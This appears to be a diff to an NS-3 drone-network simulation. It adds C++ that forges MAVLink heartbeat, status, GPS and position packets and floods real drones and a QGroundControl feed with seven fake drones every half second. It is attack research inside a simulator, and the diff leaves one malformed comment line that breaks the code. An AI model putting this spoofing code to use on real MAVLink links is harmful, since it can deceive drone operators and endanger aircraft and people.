@@ -332,33 +332,106 @@ std::vector<uint8_t> CreateHeartbeatPacket(uint8_t system_id) {
 }
 
 
-// Create a MAVLink GLOBAL_POSITION_INT message for QGroundControl spoofing
-std::vector<uint8_t> CreateQgcLocationSpoofPacket(uint8_t system_id, double lat, double lon, double alt) {
-    mavlink_message_t msg;
-    uint8_t component_id = 0;  // Typically 0 for autopilot
+// Create a comprehensive set of MAVLink packets to simulate a spoofed drone
+// This function generates a series of MAVLink packets that simulate a drone's presence and status
+// It includes HEARTBEAT, SYS_STATUS, GPS_RAW_INT, and GLOBAL_POSITION_INT messages
+// The packets are designed to make the spoofed drone appear as a legitimate entity in the network
+std::vector<std::vector<uint8_t>> CreateComprehensiveSpoofedDronePackets(uint8_t system_id, double lat, double lon, double alt_m)
+{
+    std::vector<std::vector<uint8_t>> packets;
+    packets.reserve(4);
 
-    // Calculate time since boot (monotonic)
-    static auto start_time = std::chrono::steady_clock::now();
-    auto now = std::chrono::steady_clock::now();
-    uint32_t time_boot_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now - start_time).count();
-    
-    mavlink_global_position_int_t global_pos = {};
-    global_pos.time_boot_ms = time_boot_ms;
-    global_pos.lat = static_cast<int32_t>(lat * 1e7);  // Latitude in degrees * 1e7
-    global_pos.lon = static_cast<int32_t>(lon * 1e7);  // Longitude in degrees * 1e7
-    global_pos.alt = static_cast<int32_t>(alt * 1000); // Altitude in millimeters
-    global_pos.relative_alt = static_cast<int32_t>(alt * 1000); // Relative altitude in millimeters
-    global_pos.vx = 0;  // Ground X Speed (Latitude, positive north)
-    global_pos.vy = 0;  // Ground Y Speed (Longitude, positive east)
-    global_pos.vz = 0;  // Ground Z Speed (Altitude, positive down)
-    global_pos.hdg = 0; // Vehicle heading (yaw angle) in degrees * 100, 0..359.99 degrees
+    // Use NS-3 sim time so packets look consistent in replays
+    const uint32_t time_boot_ms = (uint32_t)ns3::Simulator::Now().GetMilliSeconds();
+    const uint64_t time_usec    = (uint64_t)time_boot_ms * 1000ULL;
 
-    mavlink_msg_global_position_int_encode(system_id, component_id, &msg, &global_pos);
+    //HEARTBEAT 
+    {
+        mavlink_message_t msg{};
+        mavlink_heartbeat_t hb{};
+        hb.type          = MAV_TYPE_QUADROTOR;
+        hb.autopilot     = MAV_AUTOPILOT_ARDUPILOTMEGA;
+        hb.base_mode     = 0;
+        hb.custom_mode   = 0;
+        hb.system_status = MAV_STATE_ACTIVE;
 
-    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
-    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
-    
-    return std::vector<uint8_t>(buffer, buffer + len);
+        mavlink_msg_heartbeat_encode(system_id, /*compid*/1, &msg, &hb);
+        uint8_t buf[MAVLINK_MAX_PACKET_LEN];
+        const uint16_t len = mavlink_msg_to_send_buffer(buf, &msg);
+        packets.emplace_back(buf, buf + len);
+    }
+
+    //SYS_STATUS
+    {
+        mavlink_message_t msg{};
+        mavlink_sys_status_t st{};
+        st.onboard_control_sensors_present = 0;
+        st.onboard_control_sensors_enabled = 0;
+        st.onboard_control_sensors_health  = 0;
+        st.load             = 500;    // 50.0%
+        st.voltage_battery  = 16800;  // 16.8 V (mV)
+        st.current_battery  = 10000;  // 10 A (cA)
+        st.battery_remaining= 80;     // 80%
+        st.drop_rate_comm   = 0;
+        st.errors_comm      = 0;
+        st.errors_count1    = 0;
+        st.errors_count2    = 0;
+        st.errors_count3    = 0;
+        st.errors_count4    = 0;
+
+        mavlink_msg_sys_status_encode(system_id, /*compid*/1, &msg, &st);
+        uint8_t buf[MAVLINK_MAX_PACKET_LEN];
+        const uint16_t len = mavlink_msg_to_send_buffer(buf, &msg);
+        packets.emplace_back(buf, buf + len);
+    }
+
+    // Convert units once
+    const int32_t lat_e7 = (int32_t)std::llround(lat * 1e7);
+    const int32_t lon_e7 = (int32_t)std::llround(lon * 1e7);
+    const int32_t alt_mm = (int32_t)std::llround(alt_m * 1000.0);
+
+    // GPS_RAW_INT 
+    {
+        mavlink_message_t msg{};
+        mavlink_gps_raw_int_t gps{};
+        gps.time_usec          = time_usec;  // python used time_boot_ms; use usec for realism
+        gps.fix_type           = 3;          // 3D fix
+        gps.lat                = lat_e7;
+        gps.lon                = lon_e7;
+        gps.alt                = alt_mm;
+        gps.eph                = 100;        // HDOP*100 (arbitrary)
+        gps.epv                = 150;        // VDOP*100 (arbitrary)
+        gps.vel                = 0;
+        gps.cog                = 0;
+        gps.satellites_visible = 12;
+
+        mavlink_msg_gps_raw_int_encode(system_id, /*compid*/1, &msg, &gps);
+        uint8_t buf[MAVLINK_MAX_PACKET_LEN];
+        const uint16_t len = mavlink_msg_to_send_buffer(buf, &msg);
+        packets.emplace_back(buf, buf + len);
+    }
+
+    // GLOBAL_POSITION_INT 
+    {
+        mavlink_message_t msg{};
+        mavlink_global_position_int_t gp{};
+        gp.time_boot_ms = time_boot_ms;
+        gp.lat          = lat_e7;
+        gp.lon          = lon_e7;
+        gp.alt          = alt_mm;
+        gp.relative_alt = alt_mm;
+        gp.vx           = 0;
+        gp.vy           = 0;
+        gp.vz           = 0;
+        gp.hdg          = 0;
+
+        mavlink_msg_global_position_int_encode(system_id, /*compid*/1, &msg, &gp);
+        uint8_t buf[MAVLINK_MAX_PACKET_LEN];
+        const uint16_t len = mavlink_msg_to_send_buffer(buf, &msg);
+        packets.emplace_back(buf, buf + len);
+    }
+
+    return packets;
 }
 
 
@@ -526,28 +599,67 @@ void ExecuteGpsSpoofingAttack(Ptr<Socket> socket) {
     Simulator::Schedule(Seconds(0.2), &ExecuteGpsSpoofingAttack, socket);
 }
 
-// Attack execution function
-// This function floods the network with spoofed GPS packets for non-existent drones
+/ Attack execution function
+// This function floods the network with spoofed droness GPS packets for non-existent drones
 // It creates fake GPS packets for drones with system IDs 4 to 10 and sends them
-void ExecuteSpoofedDroneFloodAttack(ns3::Ptr<ns3::Socket> socket) {
-    // Target all real drones (0,1,2)
-    for (uint32_t i = 0; i < droneIpAddresses.size(); i++) {
-        // Create fake drones (system IDs 4-10)
-        for (uint8_t spoofedId = 4; spoofedId <= 10; spoofedId++) {
-            std::vector<uint8_t> fakeGps = CreateSpoofedDroneGpsPacket(spoofedId);
-            Ptr<Packet> packet = Create<Packet>(fakeGps.data(), fakeGps.size());
-            
-            // Send to drone's GPS port (20000)
-            socket->SendTo(packet, 0, InetSocketAddress(droneIpAddresses[i], 20000));
+// its also send to broadcast address to reach all drones in the network
+void ExecuteSpoofedDroneFloodAttack(ns3::Ptr<ns3::Socket> socket)
+{
+    NS_LOG_INFO("Executing spoofed drone flood attack at " << ns3::Simulator::Now().GetSeconds() << "s");
+
+    // Canberra base (ArduPilot defaults)
+    static const double base_lat = -35.363261;
+    static const double base_lon = 149.165230;
+
+    // sysid -> (dlat, dlon, alt_m)
+    static const std::map<uint8_t, std::tuple<double,double,double>> kGhosts = {
+        {4,  { 0.0000,  0.0000, 584.0}},
+        {5,  { 0.0001,  0.0000, 600.0}},
+        {6,  {-0.0001,  0.0000, 620.0}},
+        {7,  { 0.0000,  0.0001, 640.0}},
+        {8,  { 0.0000, -0.0001, 660.0}},
+        {9,  { 0.0002,  0.0000, 680.0}},
+        {10, {-0.0002,  0.0000, 700.0}},
+    };
+
+    for (const auto& kv : kGhosts) {
+        const uint8_t sysid = kv.first;
+        const double dlat   = std::get<0>(kv.second);
+        const double dlon   = std::get<1>(kv.second);
+        const double alt_m  = std::get<2>(kv.second);
+
+        const double lat = base_lat + dlat;
+        const double lon = base_lon + dlon;
+
+        // Build the four packets, in the same order as Python
+        auto pkts = CreateComprehensiveSpoofedDronePackets(sysid, lat, lon, alt_m);
+
+        for (const auto& blob : pkts) {
+            // Send to every real drone (UDP 20000)
+            for (const auto& ip : droneIpAddresses) {
+                ns3::Ptr<ns3::Packet> p = ns3::Create<ns3::Packet>(blob.data(), blob.size());
+                socket->SendTo(p, 0, ns3::InetSocketAddress(ip, 20000));
+            }
+
+            // Also publish raw bytes to ZMQ (for QGC forwarder)
+            if (g_commandPublisher) {
+                try {
+                    zmq::message_t m(blob.size());
+                    std::memcpy(m.data(), blob.data(), blob.size());
+                    g_commandPublisher->send(m, zmq::send_flags::none);
+                } catch (const zmq::error_t& e) {
+                    NS_LOG_ERROR("ZMQ send error: " << e.what());
+                }
+            }
         }
+
+        NS_LOG_INFO("Spoofed drone sysid=" << (int)sysid
+                    << " lat=" << lat << " lon=" << lon << " alt_m=" << alt_m);
     }
-    
-    NS_LOG_INFO("Attacker flooded network with 7 spoofed drone positions at " 
-                << Simulator::Now().GetSeconds() << "s");
-    
-    // Schedule next flood (every 0.2 seconds)
-    if (Simulator::Now().GetSeconds() < 180.0) {
-        Simulator::Schedule(Seconds(0.2), &ExecuteSpoofedDroneFloodAttack, socket);
+
+    // Re-run every 0.5s up to 180s
+    if (ns3::Simulator::Now().GetSeconds() < 180.0) {
+        ns3::Simulator::Schedule(ns3::Seconds(0.5), &ExecuteSpoofedDroneFloodAttack, socket);
     }
 }
 // Execute home position hijack attack
